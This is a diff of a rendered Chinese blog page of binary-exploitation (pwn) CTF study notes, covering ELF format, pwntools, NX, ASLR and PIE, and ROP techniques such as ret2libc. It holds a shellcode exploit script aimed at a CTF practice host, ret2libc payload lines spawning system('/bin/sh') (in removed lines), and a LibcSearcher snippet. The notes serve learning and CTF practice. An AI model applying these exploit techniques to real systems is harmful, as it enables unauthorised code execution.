@@ -358,11 +358,11 @@
             <!-- WordCount start -->
             <div class="blank_box"></div>
             <span class="meta">
-              Estimated Reading Time <span class="post-count">21</span> Minutes
+              Estimated Reading Time <span class="post-count">22</span> Minutes
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">5.2k</span> In Total
+              Words <span class="post-count">5.4k</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -437,9 +437,9 @@
 </ol>
 <h2 id="Linux下的可执行文件格式ELF">Linux下的可执行文件格式ELF</h2>
 <ul>
-<li>可执行程序：.out</li>
-<li>可重定向文件：.o</li>
-<li>共享文件：动态链接库 .so / 静态链接库 .a</li>
+<li>可执行程序：<code>.out</code></li>
+<li>可重定向文件：<code>.o</code></li>
+<li>共享文件：动态链接库 <code>.so</code> / 静态链接库 <code>.a</code></li>
 </ul>
 <p>详细结构如下：</p>
 <img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231027194208160.png" alt="image-20231027194208160" style="zoom:30%;" />
@@ -629,7 +629,7 @@
 </li>
 <li>
 <p>exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28718</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;orw&#x27;</span>)</span><br><span class="line">                                          </span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line"><span class="comment"># shellcode += shellcraft.read(3,&#x27;esp&#x27;,100)</span></span><br><span class="line"><span class="comment"># shellcode += shellcraft.write(1,&#x27;esp&#x27;,100)</span></span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,<span class="number">0x0804A060</span>+<span class="number">0x100</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="number">0x0804A060</span>+<span class="number">0x100</span>,<span class="number">100</span>)</span><br><span class="line">                                          </span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28718</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;orw&#x27;</span>)</span><br><span class="line">                                                </span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line"><span class="comment"># shellcode += shellcraft.read(3,&#x27;esp&#x27;,100)</span></span><br><span class="line"><span class="comment"># shellcode += shellcraft.write(1,&#x27;esp&#x27;,100)</span></span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,<span class="number">0x0804A060</span>+<span class="number">0x100</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="number">0x0804A060</span>+<span class="number">0x100</span>,<span class="number">100</span>)</span><br><span class="line">                                                </span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
 </blockquote>
@@ -641,6 +641,8 @@
 <h1>pwntools使用</h1>
 <p><strong>pwntools</strong>中可以直接定义一个<code>ELF</code>对象，使用<code>search</code>方法可以获得字符串的地址，由于返回结果是一个生成器，使用<code>next</code>函数得到第一个结果，然后使用<code>hex</code>方法转成十六进制地址</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; elf = ELF(<span class="string">&quot;rop&quot;</span>)</span><br><span class="line">[*] <span class="string">&#x27;/home/leo/Desktop/tmp/rop&#x27;</span></span><br><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">&gt;&gt;&gt; elf.search(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">&lt;generator object ELF.search at 0x7f0aaf3096d0&gt;</span><br><span class="line">&gt;&gt;&gt; hex(next(elf.search(b<span class="string">&quot;/bin/sh&quot;</span>)))</span><br><span class="line"><span class="string">&#x27;0x80be408&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><code>flat</code>函数把传递进来的字符都转成十六进制字节</p>
+<p><code>cyclic</code>函数生成填充数据，并且每四个字符有一个标识字符</p>
 <h1>pwndgb使用</h1>
 <ul>
 <li><code>vmmap</code>：查看当前虚拟内存情况</li>
@@ -654,6 +656,16 @@
 <h2 id="NX">NX</h2>
 <p>NX（DEP）的基本原理是将数据所在内存页标识为不可执行</p>
 <h2 id="Canary">Canary</h2>
+<h2 id="ASLR-PIE">ASLR &amp; PIE</h2>
+<p><strong>ASLR</strong>（<em>Address Space Layout Randomization</em>）是操作系统的功能选项，作用于executable（ELF）装入内存运行时，因而只能随机化stack、heap、libraries的基址</p>
+<p><strong>PIE</strong>（<em>Position Independent Executables</em>）是编译器（gcc，…）功能选项（<code>-fpie -pie</code>），作用于ELF编译过程，其随机化了ELF装载内存的基址（代码段、plt、got、data等共同的基址）</p>
+<p>PIE 最初是为了生成动态链接文件，可以让生成的文件地址无关，只能看到偏移值，可将其理解为特殊的PIC（<em>Position Independent Code</em>，so专用），加了PIE选项编译出来的ELF用file命令查看会显示其为so</p>
+<blockquote>
+<p>PIE &amp; ASLR：一个是能力赋予（on executable），一个是真正使用能力（on process）</p>
+<p>PIE只是在编译的过程中赋予了ELF加载到内存时其加载基址随机化的功能，也就是说PIE编译出来的ELF如果在<code>ASLR=0</code>的情况下，ELF的加载基址也是不会变的</p>
+<p>PIE编译出来的ELF如果在<code>ASLR=1</code>的情况下，按照ASLR定义似乎不会对heap基址随机化，但是由于ELF的基址已经随机化了，所以heap的基址自然也就被随机化了</p>
+<p>如过ELF没有使用PIE编译，在开启ASLR的情况下，只有stack、heap、libraries被随机化，代码段、plt、got、data段不会被随机化</p>
+</blockquote>
 <h1>基本ROP</h1>
 <h2 id="ret2text">ret2text</h2>
 <p>最简单的一种题型，漏洞程序中已经写有存在后门的语句，只需跳转到该语句即可，即控制程序执行程序本身已有的代码 (.text)</p>
@@ -699,25 +711,11 @@
 <p>下面说明了实际指向<code>libc-2.31.so</code>这个文件</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ~/Desktop/tmp-16:48 &gt;&gt;&gt; file /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6: symbolic link to libc-2.31.so</span><br></pre></td></tr></table></figure>
 </blockquote>
-<p>CTF Wiki给出了三个例题</p>
-<ol>
-<li>
-<p>ret2libc1：程序给出了<code>system</code>的plt和字符串<code>/bin/sh</code>，直接构造payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>ret2libc2：只给了<code>system</code>的plt，自己传入<code>/bin/sh</code>字符串，需要两个 gadgets，第一个控制程序读取字符串（可以使用<code>gets</code>函数的plt），第二个控制程序执行 <code>system(&quot;/bin/sh&quot;)</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="number">0xdeadbeef</span>, buf2])</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>ret2libc3：<code>system</code>的plt和字符串<code>/bin/sh</code>都没有给，由于延迟绑定机制，如果程序中没有调用到<code>system</code>函数，就不会有<code>system</code>函数的plt表项，那就只能找到<code>system</code>函数在<strong>libc中的真实地址</strong></p>
-<p>首先使用一些方法泄露其他函数的GOT表项的地址（即Libc中该函数的地址），然后再泄露远程主机的Libc版本（比如LibcSearcher），就可以通过偏移量计算出远程主机所使用的Libc下<code>system</code>函数的地址</p>
-</li>
-</ol>
 <ul>
 <li>
 <p>如何泄露Libc版本</p>
-<p>由于Linux下页的大小是4kb，即4096个bit，所以一个地址的末三位是在一个内存页中的偏移值，即使开启ASLR，随机化后的地址的末三位也不会发生变化</p>
+<p>由于Linux下页的大小是4kb，即4096个bit，所以一个地址的末三位是在一个内存页中的偏移值，即使开启ASLR，随机化后的地址的末三位也不会发生变化，由于libc是动态链接库，所以存的地址都是偏移值，那么根据函数名和函数在libc中的末三位地址就可以推断出libc版本，常用工具是<strong>LibcSearcher</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址，或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;fgets&quot;</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"></span><br><span class="line">obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;__libc_start_main_ret&quot;</span>)  </span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <h2 id="PLT和GOT">PLT和GOT</h2>
@@ -876,7 +874,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">二进制基础</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E8%AF%91%E4%B8%8E%E9%93%BE%E6%8E%A5"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">程序的编译与链接</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Linux%E4%B8%8B%E7%9A%84%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8FELF"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">Linux下的可执行文件格式ELF</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%BF%9B%E7%A8%8B%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">进程虚拟地址空间</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A3%85%E8%BD%BD%E4%B8%8E%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%89%A7%E8%A1%8C"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">程序的装载与进程的执行</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">shellcode编写</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">pwntools使用</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">pwndgb使用</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">栈溢出基础</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">6.</span> <span class="toc-nav-text">几种保护措施</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NX"><span class="toc-nav-number">6.1.</span> <span class="toc-nav-text">NX</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Canary"><span class="toc-nav-number">6.2.</span> <span class="toc-nav-text">Canary</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">7.</span> <span class="toc-nav-text">基本ROP</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2text"><span class="toc-nav-number">7.1.</span> <span class="toc-nav-text">ret2text</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2shellcode"><span class="toc-nav-number">7.2.</span> <span class="toc-nav-text">ret2shellcode</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2syscall"><span class="toc-nav-number">7.3.</span> <span class="toc-nav-text">ret2syscall</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2libc"><span class="toc-nav-number">7.4.</span> <span class="toc-nav-text">ret2libc</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#PLT%E5%92%8CGOT"><span class="toc-nav-number">7.5.</span> <span class="toc-nav-text">PLT和GOT</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">二进制基础</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E8%AF%91%E4%B8%8E%E9%93%BE%E6%8E%A5"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">程序的编译与链接</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Linux%E4%B8%8B%E7%9A%84%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8FELF"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">Linux下的可执行文件格式ELF</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%BF%9B%E7%A8%8B%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">进程虚拟地址空间</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A3%85%E8%BD%BD%E4%B8%8E%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%89%A7%E8%A1%8C"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">程序的装载与进程的执行</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">shellcode编写</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">pwntools使用</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">pwndgb使用</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">栈溢出基础</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">6.</span> <span class="toc-nav-text">几种保护措施</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NX"><span class="toc-nav-number">6.1.</span> <span class="toc-nav-text">NX</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Canary"><span class="toc-nav-number">6.2.</span> <span class="toc-nav-text">Canary</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ASLR-PIE"><span class="toc-nav-number">6.3.</span> <span class="toc-nav-text">ASLR &amp; PIE</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">7.</span> <span class="toc-nav-text">基本ROP</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2text"><span class="toc-nav-number">7.1.</span> <span class="toc-nav-text">ret2text</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2shellcode"><span class="toc-nav-number">7.2.</span> <span class="toc-nav-text">ret2shellcode</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2syscall"><span class="toc-nav-number">7.3.</span> <span class="toc-nav-text">ret2syscall</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2libc"><span class="toc-nav-number">7.4.</span> <span class="toc-nav-text">ret2libc</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#PLT%E5%92%8CGOT"><span class="toc-nav-number">7.5.</span> <span class="toc-nav-text">PLT和GOT</span></a></li></ol></li></ol>
         
         </div>
       </aside>
